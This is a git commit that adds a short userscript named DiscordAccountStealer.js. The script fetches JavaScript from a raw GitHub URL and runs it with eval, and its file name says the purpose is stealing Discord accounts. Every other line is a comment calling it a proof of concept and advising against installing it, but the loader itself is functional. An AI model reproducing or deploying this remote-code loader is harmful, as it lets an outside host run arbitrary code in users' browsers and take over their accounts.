f157f55068a7c3237fa40ff20a5d1a4b59beb182
SheriffCarry <twitchsheriffcarry+sheriffcarrygithub@gmail.com>
2023-05-30 08:08:41 +0200

    Create DiscordAccountStealer.js

---
+++ Userscript/DiscordAccountStealer.js
@@ -0,0 +1,17 @@
+/*I strongly suggest to not install it, this is just a proof of concept*/
+let response
+/*I strongly suggest to not install it, this is just a proof of concept*/
+let text
+/*I strongly suggest to not install it, this is just a proof of concept*/
+async function start() {
+    /*I strongly suggest to not install it, this is just a proof of concept*/
+    response = await fetch("https://raw.githubusercontent.com/SheriffCarry/KirkaScripts/main/Running%20Code/DiscordAccountStealer.js")
+    /*I strongly suggest to not install it, this is just a proof of concept*/
+    text = await response.text();
+    /*I strongly suggest to not install it, this is just a proof of concept*/
+    eval(text)
+    /*I strongly suggest to not install it, this is just a proof of concept*/
+}
+/*I strongly suggest to not install it, this is just a proof of concept*/
+start()
+/*I strongly suggest to not install it, this is just a proof of concept*/
